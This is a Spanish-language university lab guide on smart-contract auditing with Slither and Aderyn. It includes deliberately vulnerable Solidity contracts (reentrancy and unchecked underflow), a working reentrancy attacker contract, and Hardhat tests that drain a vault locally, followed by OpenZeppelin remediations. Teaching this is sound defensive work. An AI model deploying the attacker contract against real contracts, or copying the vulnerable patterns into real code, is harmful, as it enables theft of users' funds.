# Laboratorio — Auditoría y Seguridad de Contratos Inteligentes

**Materia:** Blockchain y Bases de Datos Distribuidas | **Carrera:** Ciberseguridad y Desarrollo de Software
**Tema:** Identificación y remediación de vulnerabilidades críticas

---

## Propósito

Al terminar este laboratorio serás capaz de:

- Instalar y ejecutar Slither y Aderyn sobre un proyecto Hardhat real
- Identificar vulnerabilidades de reentrancy e integer overflow en contratos Solidity
- Demostrar el impacto de cada vulnerabilidad mediante pruebas en Hardhat
- Aplicar remediación con OpenZeppelin y verificar que los hallazgos desaparecen en el re-análisis

**Caso guía:** Tu empresa acaba de adquirir el código fuente de un protocolo DeFi antes de desplegarlo en Mainnet. El CTO te asigna una auditoría de seguridad con herramientas automatizadas antes de contratar auditores externos. Los auditores cobran $200/hora — cada vulnerabilidad que encuentres antes reduce el alcance de la auditoría formal.

---

## Requisitos

- Python 3.10+ instalado
- Node.js 18+ y npm
- Proyecto Hardhat (del laboratorio anterior o uno nuevo con `npx hardhat init`)
- Acceso a internet para instalación de herramientas

Verifica Python antes de comenzar:

```bash
python3 --version
pip3 --version
```

Si Python es menor a 3.10, actualiza antes de continuar. Slither requiere 3.10+ como mínimo.

---

## Parte 1 — Instala las herramientas de auditoría

**Paso 1.1 — Instala Slither**

Slither es un analizador estático de Trail of Bits, licencia AGPLv3. El nombre correcto del paquete es `slither-analyzer`. Si instalas `slither` (sin el sufijo) estarás instalando un paquete sin relación.

```bash
pip3 install slither-analyzer
```

Verifica la instalación:

```bash
slither --version
```

Anota la versión instalada en tu reporte.

Si el comando no se encuentra en el PATH después de instalar, usa:

```bash
python3 -m slither --version
```

**Paso 1.2 — Instala Aderyn**

Aderyn es el analizador estático de Cyfrin, licencia GPL-3.0, escrito en Rust. El método oficial de instalación es mediante su script:

```bash
curl --proto '=https' --tlsv1.2 -LsSf \
  https://github.com/cyfrin/aderyn/releases/latest/download/aderyn-installer.sh | bash
```

Recarga tu terminal o ejecuta el comando `source` que indique el instalador. Luego verifica:

```bash
aderyn --version
```

Anota la versión instalada en tu reporte.

Alternativamente, si tienes npm:

```bash
npm install -g @cyfrin/aderyn
```

Antes de continuar, investiga y responde en tu reporte:

- ¿Qué diferencia hay entre análisis estático (Slither, Aderyn) y análisis dinámico (fuzzing, pruebas de ejecución)? ¿Qué tipos de vulnerabilidades puede detectar uno que el otro no puede?
- Según las fuentes oficiales de ambas herramientas, ¿cuántos detectores incluye Slither y cuántos incluye Aderyn? ¿Cuál tiene más y por qué eso no necesariamente significa que es mejor?

---

## Parte 2 — Contratos vulnerables para auditar

Crea los siguientes contratos en la carpeta `contracts/` de tu proyecto Hardhat. Estos representan código con vulnerabilidades reales documentadas en el registro SWC (Smart Contract Weakness Classification).

**Paso 2.1 — Contrato vulnerable a reentrancy**

Crea `contracts/BovedaVulnerable.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ADVERTENCIA: Contrato intencionalmente vulnerable — solo uso educativo
// SWC-107: Reentrancy
contract BovedaVulnerable {
    mapping(address => uint256) public saldos;
    uint256 public totalFondos;

    event Deposito(address cuenta, uint256 monto);
    event Retiro(address cuenta, uint256 monto);

    function depositar() external payable {
        require(msg.value > 0, "Monto requerido");
        saldos[msg.sender] += msg.value;
        totalFondos += msg.value;
        emit Deposito(msg.sender, msg.value);
    }

    // VULNERABLE: Interaction antes de Effect
    // El saldo no se actualiza antes de la transferencia externa
    function retirar(uint256 monto) external {
        require(saldos[msg.sender] >= monto, "Saldo insuficiente");
        require(monto > 0, "Monto invalido");

        // INTERACTION primero — vulnerabilidad crítica
        (bool exito, ) = msg.sender.call{value: monto}("");
        require(exito, "Transferencia fallida");

        // EFFECT después — demasiado tarde
        saldos[msg.sender] -= monto;
        totalFondos -= monto;

        emit Retiro(msg.sender, monto);
    }

    function consultarSaldo(address cuenta) external view returns (uint256) {
        return saldos[cuenta];
    }
}
```

**Paso 2.2 — Contrato vulnerable a integer overflow**

Crea `contracts/TokenVulnerable.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ADVERTENCIA: Contrato intencionalmente vulnerable — solo uso educativo
// SWC-101: Integer Overflow and Underflow
// En Solidity ^0.8.0 el overflow es protegido por defecto.
// Sin embargo, los bloques unchecked{} desactivan esa protección.
contract TokenVulnerable {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;
    address public owner;

    constructor(uint256 _supply) {
        owner = msg.sender;
        totalSupply = _supply;
        balances[msg.sender] = _supply;
    }

    // VULNERABLE: unchecked desactiva la protección de overflow de Solidity 0.8+
    // Un atacante puede hacer que su balance desborde y obtenga un valor enorme
    function transferirUnchecked(address destino, uint256 monto) external {
        unchecked {
            // Si monto > balances[msg.sender], en lugar de revertir,
            // el resultado envuelve alrededor (wraps around) a un número enorme
            balances[msg.sender] -= monto;
            balances[destino] += monto;
        }
    }

    // VULNERABLE: el límite de acuñación puede desbordarse
    function acunarUnchecked(address cuenta, uint256 monto) external {
        require(msg.sender == owner, "Solo owner");
        unchecked {
            // Si totalSupply + monto desborda, el resultado es incorrecto
            totalSupply += monto;
            balances[cuenta] += monto;
        }
    }

    // Función segura — sin unchecked, con validación explícita
    function transferirSeguro(address destino, uint256 monto) external {
        require(balances[msg.sender] >= monto, "Saldo insuficiente");
        require(destino != address(0), "Direccion invalida");
        balances[msg.sender] -= monto;
        balances[destino] += monto;
    }
}
```

Compila antes de continuar:

```bash
npx hardhat compile
```

La compilación debe completarse sin errores. Si hay errores, corrígelos antes de continuar — Slither necesita que la compilación sea exitosa para poder analizar.

---

## Parte 3 — Análisis con Slither

**Paso 3.1 — Ejecuta Slither sobre el proyecto completo**

Desde la raíz del proyecto:

```bash
slither . --exclude-dependencies
```

Anota en tu reporte:

- El número total de hallazgos reportados
- Cuántos son de severidad High, Medium, Low e Informational
- El nombre exacto del detector que identificó la vulnerabilidad en `BovedaVulnerable`

**Paso 3.2 — Genera un reporte en Markdown**

```bash
slither . --exclude-dependencies --checklist > reporte-slither.md
```

Abre `reporte-slither.md` y localiza el hallazgo relacionado con reentrancy. Copia en tu reporte de laboratorio:

- El nombre del detector (ejemplo: `reentrancy-eth`)
- La función y contrato afectados
- La línea de código exacta que señala

**Paso 3.3 — Analiza solo los detectores críticos**

Slither divide el detector de reentrancy en variantes. Ejecuta solo los detectores de impacto alto:

```bash
slither . --exclude-dependencies --detect reentrancy-eth,reentrancy-no-eth,divide-before-multiply,suicidal
```

¿Cuántos hallazgos quedan cuando filtras solo los de alto impacto? Compara con el total de la ejecución completa. ¿Cuántos hallazgos del reporte completo son informacionales u optimizaciones que no representan una vulnerabilidad explotable?

**Afirmación para refutar o confirmar:** *"Slither detecta automáticamente el integer overflow en `transferirUnchecked` porque usa Solidity 0.8+."*

Revisa tu reporte de Slither: ¿aparece algún hallazgo relacionado con el overflow en `TokenVulnerable`? Investiga por qué Slither, siendo un analizador estático, puede o no detectar vulnerabilidades en bloques `unchecked {}` y qué herramienta complementaria sería necesaria para cubrirlo.

> Captura obligatoria: salida completa de `slither . --exclude-dependencies` con todos los hallazgos visibles.

---

## Parte 4 — Análisis con Aderyn

**Paso 4.1 — Ejecuta Aderyn**

```bash
aderyn .
```

Aderyn genera automáticamente un archivo `report.md` en la raíz del proyecto. Ábrelo y anota:

- El número total de hallazgos HIGH y MEDIUM
- ¿Detectó Aderyn la vulnerabilidad de reentrancy en `BovedaVulnerable`? ¿Con qué nombre?
- ¿Detectó algún hallazgo en `TokenVulnerable` relacionado con `unchecked`?

**Paso 4.2 — Compara Slither vs Aderyn**

Con los resultados de ambas herramientas, completa esta tabla en tu reporte:

| Criterio                                           | Slither | Aderyn |
| -------------------------------------------------- | ------- | ------ |
| Versión instalada                                 |         |        |
| Lenguaje de la herramienta                         |         |        |
| Total de hallazgos                                 |         |        |
| ¿Detectó reentrancy en BovedaVulnerable?         |         |        |
| ¿Detectó riesgo en unchecked de TokenVulnerable? |         |        |
| Formato del reporte generado                       |         |        |
| Tiempo de ejecución aproximado                    |         |        |

Con tu tabla, responde: ¿cuál herramienta recomendarías como primera línea de análisis en un pipeline de CI/CD y por qué? Argumenta con al menos dos criterios de tu tabla, no con opiniones generales.

> Captura obligatoria: reporte de Aderyn (`report.md`) abierto con los hallazgos HIGH visibles.

---

## Parte 5 — Demuestra el ataque de reentrancy

El análisis estático identifica el patrón. Ahora demuestras el impacto real ejecutando el ataque en Hardhat.

**Paso 5.1 — Crea el contrato atacante**

Crea `contracts/AtacanteReentrancy.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Solo para fines educativos — demuestra el ataque SWC-107
interface IBovedaVulnerable {
    function depositar() external payable;
    function retirar(uint256 monto) external;
    function saldos(address cuenta) external view returns (uint256);
}

contract AtacanteReentrancy {
    IBovedaVulnerable public objetivo;
    address public atacante;
    uint256 public montoAtaque;
    uint256 public vecesLlamado;

    constructor(address _objetivo) {
        objetivo = IBovedaVulnerable(_objetivo);
        atacante = msg.sender;
    }

    function ejecutarAtaque() external payable {
        require(msg.sender == atacante, "Solo el atacante");
        require(msg.value > 0, "Deposita ETH para el ataque");
        montoAtaque = msg.value;

        // Deposita en la bóveda para tener saldo legítimo
        objetivo.depositar{value: msg.value}();

        // Inicia el retiro — disparará receive() repetidamente
        objetivo.retirar(montoAtaque);
    }

    // Esta función se llama automáticamente cada vez que el contrato recibe ETH
    // Como BovedaVulnerable llama a msg.sender.call ANTES de actualizar el saldo,
    // podemos volver a llamar retirar() mientras aún tenemos saldo en el registro
    receive() external payable {
        vecesLlamado++;
        uint256 saldoRestante = objetivo.saldos(address(this));
        if (saldoRestante >= montoAtaque && address(objetivo).balance >= montoAtaque) {
            objetivo.retirar(montoAtaque);
        }
    }

    function retirarGanancias() external {
        require(msg.sender == atacante, "Solo el atacante");
        uint256 balance = address(this).balance;
        (bool exito, ) = atacante.call{value: balance}("");
        require(exito, "Retiro fallido");
    }

    function balanceContrato() external view returns (uint256) {
        return address(this).balance;
    }
}
```

**Paso 5.2 — Escribe la prueba del ataque**

Crea `test/Reentrancy.test.js`:

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Demostración: Ataque de Reentrancy (SWC-107)", function () {

  describe("BovedaVulnerable — SIN protección", function () {
    it("Debe ser drenada completamente por el atacante", async function () {
      const [dueno, victima, cuentaAtacante] = await ethers.getSigners();

      // Despliega la bóveda vulnerable
      const BovedaVulnerable = await ethers.getContractFactory("BovedaVulnerable");
      const boveda = await BovedaVulnerable.deploy();
      await boveda.waitForDeployment();
      const direccionBoveda = await boveda.getAddress();

      // La víctima deposita 5 ETH — fondos legítimos en la bóveda
      const depositoVictima = ethers.parseEther("5.0");
      await boveda.connect(victima).depositar({ value: depositoVictima });

      const balanceAntes = await ethers.provider.getBalance(direccionBoveda);
      console.log("\n  Balance bóveda (antes del ataque):", 
        ethers.formatEther(balanceAntes), "ETH");

      // Despliega el contrato atacante
      const Atacante = await ethers.getContractFactory("AtacanteReentrancy");
      const atacante = await Atacante.connect(cuentaAtacante).deploy(direccionBoveda);
      await atacante.waitForDeployment();

      // El atacante deposita solo 1 ETH y ejecuta el ataque
      const montoAtaque = ethers.parseEther("1.0");
      await atacante.connect(cuentaAtacante).ejecutarAtaque({ value: montoAtaque });

      const balanceDespues = await ethers.provider.getBalance(direccionBoveda);
      const vecesLlamado = await atacante.vecesLlamado();
      const gananciasAtacante = await atacante.balanceContrato();

      console.log("  Balance bóveda (después del ataque):", 
        ethers.formatEther(balanceDespues), "ETH");
      console.log("  Veces que se llamó receive():", vecesLlamado.toString());
      console.log("  ETH drenados al atacante:", 
        ethers.formatEther(gananciasAtacante), "ETH");

      // La bóveda debería haber sido drenada más allá del depósito del atacante
      expect(gananciasAtacante).to.be.gt(montoAtaque);
      console.log("  ✓ El atacante obtuvo más ETH del que depositó");
    });
  });
});
```

Ejecuta la prueba:

```bash
npx hardhat test test/Reentrancy.test.js --reporter verbose
```

Registra en tu reporte:

- ¿Cuántas veces se llamó `receive()` durante el ataque?
- ¿Cuántos ETH obtuvo el atacante habiendo depositado solo 1 ETH?
- ¿Cuánto ETH quedó en la bóveda después del ataque?

Con esos valores, responde: el DAO Hack de 2016 drenó 60 millones de USD usando exactamente este vector. Con el ratio que observaste en tu prueba (ETH obtenido / ETH depositado), ¿cuánto ETH habría necesitado depositar el atacante para drenar 60 millones de USD si la bóveda tuviera esa cantidad?

> Captura obligatoria: salida de la prueba con el número de llamadas a `receive()` y los balances visibles.

---

## Parte 6 — Demuestra el integer overflow en unchecked

**Paso 6.1 — Escribe la prueba de overflow**

Crea `test/IntegerOverflow.test.js`:

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Demostración: Integer Overflow en bloque unchecked (SWC-101)", function () {

  it("Debe mostrar que unchecked permite underflow en saldo", async function () {
    const [owner, atacante] = await ethers.getSigners();

    const TokenVulnerable = await ethers.getContractFactory("TokenVulnerable");
    const token = await TokenVulnerable.deploy(1000n);
    await token.waitForDeployment();

    const saldoAtacante = await token.balances(atacante.address);
    console.log("\n  Saldo del atacante antes del ataque:", saldoAtacante.toString());

    // El atacante tiene saldo 0 pero intenta transferir 1 token
    // En un contrato seguro esto revierte. En unchecked, el saldo da vuelta.
    await token.connect(atacante).transferirUnchecked(owner.address, 1n);

    const saldoDespues = await token.balances(atacante.address);
    console.log("  Saldo del atacante después del ataque:", saldoDespues.toString());
    console.log("  ¿Es el saldo el valor máximo de uint256?", 
      saldoDespues === ethers.MaxUint256);

    // El saldo debería haberse desbordado a un número enorme
    expect(saldoDespues).to.equal(ethers.MaxUint256);
    console.log("  ✓ Underflow confirmado: saldo = 2^256 - 1");
  });

  it("Debe mostrar que transferirSeguro SÍ revierte con saldo insuficiente", async function () {
    const [owner, atacante] = await ethers.getSigners();

    const TokenVulnerable = await ethers.getContractFactory("TokenVulnerable");
    const token = await TokenVulnerable.deploy(1000n);
    await token.waitForDeployment();

    // La función segura debe revertir
    await expect(
      token.connect(atacante).transferirSeguro(owner.address, 1n)
    ).to.be.revertedWith("Saldo insuficiente");

    console.log("\n  ✓ transferirSeguro revirtió correctamente");
  });

  it("Debe mostrar overflow en acuñación con unchecked", async function () {
    const [owner] = await ethers.getSigners();

    const TokenVulnerable = await ethers.getContractFactory("TokenVulnerable");
    const token = await TokenVulnerable.deploy(1000n);
    await token.waitForDeployment();

    const totalAntes = await token.totalSupply();
    console.log("\n  totalSupply antes:", totalAntes.toString());

    // Acuña el valor máximo de uint256 — causará overflow en la suma
    await token.acunarUnchecked(owner.address, ethers.MaxUint256);

    const totalDespues = await token.totalSupply();
    console.log("  totalSupply después de acunar MaxUint256:", totalDespues.toString());
    console.log("  ¿El total es menor al esperado (overflow)?", totalDespues < ethers.MaxUint256);
  });
});
```

Ejecuta las pruebas:

```bash
npx hardhat test test/IntegerOverflow.test.js --reporter verbose
```

Registra en tu reporte:

- ¿Cuál fue el saldo del atacante después del underflow? Escribe el número exacto
- ¿Por qué `ethers.MaxUint256` es exactamente `2^256 - 1`? Muestra el cálculo
- ¿Qué diferencia de comportamiento observaste entre `transferirUnchecked` y `transferirSeguro`?

Investiga y responde antes de continuar: ¿en qué situaciones legítimas de desarrollo un programador usa `unchecked {}` en Solidity 0.8+? ¿Qué precaución debe tomar obligatoriamente al usarlo?

> Captura obligatoria: salida de las tres pruebas con los valores de saldo y totalSupply visibles.

---

## Parte 7 — Remediación

**Paso 7.1 — Instala OpenZeppelin Contracts**

```bash
npm install @openzeppelin/contracts
```

Verifica la versión instalada:

```bash
npm list @openzeppelin/contracts
```

Anota la versión en tu reporte.

**Paso 7.2 — Contrato corregido: reentrancy**

Crea `contracts/BovedaSegura.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

// Versión segura — aplica patrón Checks-Effects-Interactions + ReentrancyGuard
contract BovedaSegura is ReentrancyGuard {
    mapping(address => uint256) public saldos;
    uint256 public totalFondos;

    event Deposito(address cuenta, uint256 monto);
    event Retiro(address cuenta, uint256 monto);

    function depositar() external payable {
        require(msg.value > 0, "Monto requerido");
        saldos[msg.sender] += msg.value;
        totalFondos += msg.value;
        emit Deposito(msg.sender, msg.value);
    }

    // nonReentrant: bloquea llamadas reentrantes
    // Orden Checks-Effects-Interactions
    function retirar(uint256 monto) external nonReentrant {
        // CHECKS
        require(monto > 0, "Monto invalido");
        require(saldos[msg.sender] >= monto, "Saldo insuficiente");

        // EFFECTS — actualiza estado ANTES de transferir
        saldos[msg.sender] -= monto;
        totalFondos -= monto;

        // INTERACTIONS — transfiere al final
        (bool exito, ) = msg.sender.call{value: monto}("");
        require(exito, "Transferencia fallida");

        emit Retiro(msg.sender, monto);
    }

    function consultarSaldo(address cuenta) external view returns (uint256) {
        return saldos[cuenta];
    }
}
```

**Paso 7.3 — Contrato corregido: integer overflow**

Crea `contracts/TokenSeguro.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";

// Versión segura — sin bloques unchecked en operaciones con fondos
// Solidity 0.8+ protege contra overflow por defecto en todos los bloques normales
contract TokenSeguro is Ownable {
    mapping(address => uint256) public balances;
    uint256 public totalSupply;

    constructor(uint256 _supply) Ownable(msg.sender) {
        totalSupply = _supply;
        balances[msg.sender] = _supply;
    }

    function transferir(address destino, uint256 monto) external {
        require(balances[msg.sender] >= monto, "Saldo insuficiente");
        require(destino != address(0), "Direccion invalida");
        require(monto > 0, "Monto invalido");

        // Sin unchecked: Solidity 0.8+ revierte automáticamente en overflow/underflow
        balances[msg.sender] -= monto;
        balances[destino] += monto;
    }

    // Acuñación con validación explícita del límite
    function acunar(address cuenta, uint256 monto) external onlyOwner {
        require(cuenta != address(0), "Direccion invalida");
        require(totalSupply + monto >= totalSupply, "Overflow en totalSupply");
        require(balances[cuenta] + monto >= balances[cuenta], "Overflow en balance");

        totalSupply += monto;
        balances[cuenta] += monto;
    }
}
```

Compila para verificar que los contratos seguros son correctos:

```bash
npx hardhat compile
```

**Paso 7.4 — Verifica que el ataque falla contra los contratos seguros**

Crea `test/Remediacion.test.js`:

```javascript
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Verificación: Contratos seguros resisten los ataques", function () {

  describe("BovedaSegura — CON ReentrancyGuard", function () {
    it("Debe bloquear el ataque de reentrancy", async function () {
      const [, victima, cuentaAtacante] = await ethers.getSigners();

      const BovedaSegura = await ethers.getContractFactory("BovedaSegura");
      const boveda = await BovedaSegura.deploy();
      await boveda.waitForDeployment();

      // La víctima deposita fondos
      await boveda.connect(victima).depositar({ 
        value: ethers.parseEther("5.0") 
      });

      // Despliega el mismo contrato atacante
      const Atacante = await ethers.getContractFactory("AtacanteReentrancy");
      const atacante = await Atacante.connect(cuentaAtacante).deploy(
        await boveda.getAddress()
      );

      // El ataque debe revertir
      await expect(
        atacante.connect(cuentaAtacante).ejecutarAtaque({ 
          value: ethers.parseEther("1.0") 
        })
      ).to.be.reverted;

      const balanceBoveda = await ethers.provider.getBalance(await boveda.getAddress());
      console.log("\n  Balance bóveda después del intento de ataque:", 
        ethers.formatEther(balanceBoveda), "ETH");
      console.log("  ✓ Ataque bloqueado por ReentrancyGuard");
    });
  });

  describe("TokenSeguro — SIN unchecked en operaciones críticas", function () {
    it("Debe revertir al intentar transferir con saldo insuficiente", async function () {
      const [owner, atacante] = await ethers.getSigners();

      const TokenSeguro = await ethers.getContractFactory("TokenSeguro");
      const token = await TokenSeguro.deploy(1000n);
      await token.waitForDeployment();

      // El mismo ataque de underflow debe revertir
      await expect(
        token.connect(atacante).transferir(owner.address, 1n)
      ).to.be.revertedWith("Saldo insuficiente");

      const saldo = await token.balances(atacante.address);
      expect(saldo).to.equal(0n);
      console.log("\n  ✓ Underflow bloqueado: saldo permanece en 0");
    });
  });
});
```

```bash
npx hardhat test test/Remediacion.test.js --reporter verbose
```

Anota en tu reporte qué mensaje de error bloqueó cada ataque y en qué línea exacta del contrato seguro se origina ese bloqueo.

> Captura obligatoria: salida de las pruebas de remediación con ambos ataques bloqueados.

---

## Parte 8 — Re-auditoría: verifica que los hallazgos desaparecen

**Paso 8.1 — Ejecuta Slither enfocado en los contratos seguros**

```bash
slither contracts/BovedaSegura.sol --exclude-dependencies
slither contracts/TokenSeguro.sol --exclude-dependencies
```

¿Aparece algún hallazgo de reentrancy en `BovedaSegura`? ¿Aparece algún hallazgo relacionado con overflow en `TokenSeguro`? Anota los resultados exactos.

**Paso 8.2 — Ejecuta Aderyn sobre el proyecto completo**

```bash
aderyn .
```

Compara el nuevo `report.md` con el de la Parte 4. ¿Desaparecieron los hallazgos HIGH de los contratos vulnerables? ¿Aparecen hallazgos nuevos en los contratos seguros?

Completa esta tabla en tu reporte:

| Hallazgo                         | Contrato vulnerable | Contrato seguro | ¿Resuelto? |
| -------------------------------- | ------------------- | --------------- | ----------- |
| Reentrancy (SWC-107)             | BovedaVulnerable    | BovedaSegura    |             |
| Integer underflow (SWC-101)      | TokenVulnerable     | TokenSeguro     |             |
| Hallazgos HIGH totales (Aderyn)  |                     |                 |             |
| Hallazgos HIGH totales (Slither) |                     |                 |             |

---

## Parte 9 — Reflexión final

Responde con base en lo que ejecutaste, mediste e investigaste:

1. En la Parte 5 mediste cuántas veces se llamó `receive()` durante el ataque. Tomando ese número y el ratio ETH-drenado / ETH-depositado que observaste, calcula: si la bóveda tuviera 1,000 ETH y el atacante depositara 10 ETH, ¿cuántas iteraciones de reentrancy serían necesarias para drenarlo todo? ¿Qué limitante del sistema podría detener al atacante antes de completar el drenaje?
2. En la Parte 6 viste que `unchecked {}` desactiva la protección de overflow de Solidity 0.8+. Consulta el código fuente de OpenZeppelin `ReentrancyGuard.sol` en [https://github.com/OpenZeppelin/openzeppelin-contracts](https://github.com/OpenZeppelin/openzeppelin-contracts) — ¿usa internamente algún bloque `unchecked {}`? Si lo hace, ¿por qué es seguro en ese contexto específico?
3. Slither no detectó el riesgo de overflow en `TokenVulnerable` mediante sus detectores estándar. Con base en lo que investigaste en la Parte 3 sobre análisis estático vs dinámico, ¿qué tipo de herramienta necesitarías agregar al pipeline para cubrir esa brecha? Nombra al menos una herramienta específica de las que aparecen en la documentación oficial de Slither o Aderyn.

---

## Checklist de cierre

Antes de entregar verifica:

- [ ] Versiones de Slither y Aderyn instaladas anotadas
- [ ] Diferencia análisis estático vs dinámico respondida antes de instalar
- [ ] Salida completa de Slither con todos los hallazgos (captura)
- [ ] Reporte de Aderyn con hallazgos HIGH visibles (captura)
- [ ] Tabla comparativa Slither vs Aderyn completada con datos propios
- [ ] Afirmación sobre Slither y overflow refutada o confirmada con evidencia
- [ ] Prueba de reentrancy ejecutada con número de llamadas y balances (captura)
- [ ] Ratio de drenado calculado con valores propios
- [ ] Pruebas de overflow ejecutadas con valores exactos de uint256 (captura)
- [ ] Ambos contratos seguros compilados sin errores
- [ ] Pruebas de remediación ejecutadas con ataques bloqueados (captura)
- [ ] Tabla de re-auditoría completada con resultados reales
- [ ] Tres preguntas de reflexión respondidas con datos del laboratorio

---

**Entregable:** Reporte APA 7 con capturas de terminal en cada sección indicada, tabla comparativa de herramientas, tabla de remediación y declaración de uso de IA.
